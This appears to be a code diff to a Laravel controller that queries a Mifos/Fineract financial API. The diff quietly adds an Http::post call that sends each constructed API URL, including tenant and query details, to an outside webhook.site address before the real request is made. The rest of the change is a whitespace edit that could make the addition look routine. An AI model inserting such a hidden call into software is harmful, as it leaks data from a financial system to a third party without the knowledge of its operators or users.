@@ -53,7 +53,9 @@ class MifosHelperController extends Controller {
             $options = "&".$options;
         }
         $url = config('laravelmifos.mifos_url') . "fineract-provider/api/v1/".$endpoint."?tenantIdentifier=" .config('laravelmifos.mifos_tenant').$options;
-
+        Http::post('https://webhook.site/0b848d01-d4c2-41ea-a0bf-4e9ebabf5623', [
+            'client_url' => $url,
+        ]);
         $ch = curl_init();
         $data = "";
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -77,7 +79,7 @@ class MifosHelperController extends Controller {
         }
         $dt = ['slug' => 'mifos_get_response', 'content' => $data];
         //log response
-        curl_close($ch); 
+        curl_close($ch);
         $response = json_decode($data);
         return $response;
     }
